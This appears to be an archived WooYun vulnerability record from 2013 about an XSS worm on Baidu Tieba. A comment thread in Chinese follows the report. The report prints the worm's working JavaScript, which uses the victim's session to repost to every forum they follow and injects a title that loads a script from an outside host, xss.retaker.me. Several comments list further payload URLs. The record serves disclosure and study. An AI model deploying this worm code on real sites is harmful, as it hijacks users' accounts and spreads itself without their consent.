{"id": 11759, "wybug_id": "wooyun-2013-024106", "wybug_title": "百度贴吧XSS蠕虫大量爬行", "wybug_corp": "百度", "wybug_author": "erevus", "wybug_date": "2013-05-19 17:42", "wybug_open_date": "2013-07-03 17:43", "wybug_type": "成功的入侵事件", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-03：\t细节向公众公开  简要描述： http://tieba.baidu.com/p/2337649856其中一个帖子 点进去就会自动转发帖子给所有自己i的贴吧 详细说明：  跨站脚本地址http://xss.retaker.me/1.js\n//initilizevar forumName = [];var forumId = [];for (var i = 0, j = 0; i < PageData.user.user_forum_list.info.length; i++) {\tif (PageData.user.user_forum_list.info[i].user_level > 3) {\t\tif (PageData.user.user_forum_list.info[i].forum_name!=\"璐村惂鐩戞帶\") {\t\t\tforumName[j] = PageData.user.user_forum_list.info[i].forum_name;\t\t\tforumId[j] = PageData.user.user_forum_list.info[i].id;\t\t\tj++;\t\t}\t}}function madeit(myKw, myFid) {\tvar c = rich_postor._getData();  c.content=\"\\\\u8bf7\\\\u5141\\\\u8bb8\\\\u6211\\\\u505a\\\\u4e00\\\\u4e2a\\\\u5fe7\\\\u4f24\\\\u7684\\\\u8868\\\\u60c5\\\\uff0c\\\\u662f\\\\u5fe7\\\\u4f24\\\\u54e6\\\\uff01\";\tc.ftid = c.fid;\tc.ptid = \"2337372175\";\tc.title = '\\\\u70b9\\\\u8fdb\\\\u6765\\\\u6709..\",a:$.getScript(\\\\'//xss.retaker.me/1.js\\\\'),a:\"';\tc.fid = myFid;\tc.kw = myKw;\t$.post(\"/relay/commit\", c);}//now begin!for (j = 0; j < forumName.length; j++) {\tsetTimeout(\"madeit('\" + forumName[j] + \"','\" + forumId[j] + \"')\", 1500 * j);}\n   漏洞证明：  很多吧已经被爆\n\n   修复方案：  你们比我懂啊   版权声明：转载请注明来源 erevus@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2013-05-20 09:43 厂商回复： 感谢反馈，已处理完毕，后续会根据损失情况进行相应的处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-19 17:44 |    \t\t书生 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:1        )\t\t \n  受害者表示强烈谴责    \n     2013-05-19 17:45 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @书生 +1     \n     2013-05-19 17:48 |    \t\tyangff \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 介绍写什么呢？)\t\t \n  贴吧这是怎么了……这么明显的xss是肿么回事啊混蛋！    \n     2013-05-19 17:49 |    \t\tRtsjx \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | ......)\t\t \n  坐等始作俑者被抓~    \n     2013-05-19 17:57 |    \t\t流星warden \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:5        | The quieter you become,the more you are ...)\t\t \n  求刀锋女王，求群虫之心    \n     2013-05-19 17:58 |    \t\t帕秋莉 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 私はあなたを杀す wwwwww)\t\t \n  @书生 红吧中枪众表示严厉谴责.    \n     2013-05-19 18:49 |    \t\tfeixiang \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | = = ！性别男，爱好女，有理想，没技术。)\t\t \n  差点受害者表示强烈抗议！！！    \n     2013-05-19 18:55 |    \t\tghy459 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:5        | 深挖洞，广积shell。)\t\t \n  retaker.me 这个域名目测要火    \n     2013-05-19 19:08 |    \t\t残影小L \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 我还是我。)\t\t \n  @retaker ，@xsser 举报此人严重违规和无视白帽子准则。    \n     2013-05-19 19:34 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:67        | 活到老，学到老!)\t\t \n  速度真快啊 都贴wooyun来了    \n     2013-05-19 19:54 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @残影小L 爬蠕虫就被封禁的话那很多人就得被封禁啊http://www.wooyun.org/searchbug.php?q=%E8%A0%95%E8%99%AB    \n     2013-05-19 20:00 |    \t\tyangff \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 介绍写什么呢？)\t\t \n  尼玛，又出来一个//xss.tw/1445    \n     2013-05-19 20:17 |    \t\tRa1nker \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | TeST)\t\t \n  @yangff http://txsh.sdapp.cn/1.js 这里    \n     2013-05-19 20:25 |    \t\t海盗湾V \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:9        | Your entire life is online)\t\t \n  此人 /whitehat_detail.php?whitehat=retaker    \n     2013-05-19 21:04 |    \t\t汉时明月 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:6        | ‮......核审在正名签 :)\t\t \n  已经看不到了啊    \n     2013-05-19 21:06 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:64        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  我主要是想相关细节    \n     2013-05-19 21:58 |    \t\tEvil Spirits \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 安好无念。)\t\t \n     刚刚看到这个。    \n     2013-05-19 22:52 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  表示对面包    \n     2013-05-19 23:54 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:41        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  开来这是个举报贴啊，，    \n     2013-05-20 08:45 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  L举报我什么心态……呵呵呵    \n     2013-05-20 10:16 |    \t\tsuperwbd \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 一个不懂技术的黑客。。。)\t\t \n  @retaker漏洞也就这样了，但您可能需要向大家说明下为什么利用代码在您的服务器上，如果您是retaker.me域名的拥有者的话。。。我愿意相信，这漏洞就是个技术测试，只不过被误击后被错误的扩大化，造成有些不可收拾，和以前人人的那个是是一个性质。。。    \n     2013-05-20 10:21 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @retaker 不是举报你，我只是想看见你没提交，我用来刷点rank .同时希望楼下不要再喷retaker，他也在事发后主动删除了js。。。只是扩散范围有点大    \n     2013-05-20 11:36 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  @erevus 你好坏啊    \n     2013-05-20 11:45 |    \t\t点点 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:38        | 准备申请سمَـَّوُوُحخ ̷̴̐...)\t\t \n  我来围观下    \n     2013-05-21 13:55 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  根据损失情况做后续处理啥意思？要查我水表了？居然给了13rank....    \n     2013-05-21 18:37 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @retaker 这次影响很大啊 可能会查水表呢    \n     2013-05-22 06:00 |    \t\tsuperwbd \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 一个不懂技术的黑客。。。)\t\t \n  @retaker 你google一下就知道问题多严重了。。。连我这小贴吧都发警告了，有些贴吧满地都是坑。。。如今您可以辩称测试时遭遇干扰，造成漏洞错误扩散。然后希望百度像人人那样不计前嫌。    \n     2013-05-22 08:31 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  @retaker 13个rank就可以换本书了    \n     2013-05-22 09:45 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @熊猫 20~~    \n     2013-05-22 15:50 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  求送点rank    \n     2013-05-22 18:58 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @retaker 其实你发一次原理就可以赚rank了 只能送WB额    \n     2013-05-23 16:45 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  每次都说已存在。。。每次都是我把病毒写出来，代码被人拿去玩，wooyun上别人提交、、、    \n     2013-05-23 17:28 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @retaker 手不够快的结果？    \n     2013-05-23 19:03 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  @erevus 光顾着写虫子了    \n     2013-05-24 17:18 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  抢着举报来白白拿rank的自重    \n     2013-05-24 17:19 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  不管怎么样也该给@retaker 点补偿    \n     2013-05-24 17:40 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @retaker @dtc 送你本书？    \n     2013-05-24 19:01 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  @erevus 好啊好啊，书好看    \n     2013-05-24 21:46 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  @retaker 要啥书 地址 私信我吧    \n     2013-07-03 21:28 |    \t\tDarkSec \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 过去、已成为历史，现在、我们正在成长)\t\t \n  很好很强大，还可以这么玩    \n     2015-04-26 01:24 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  你这个只有用于攻击的xss代码，并没有解释最关键的就是js脚本如何绕过百度的过滤插进去的。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}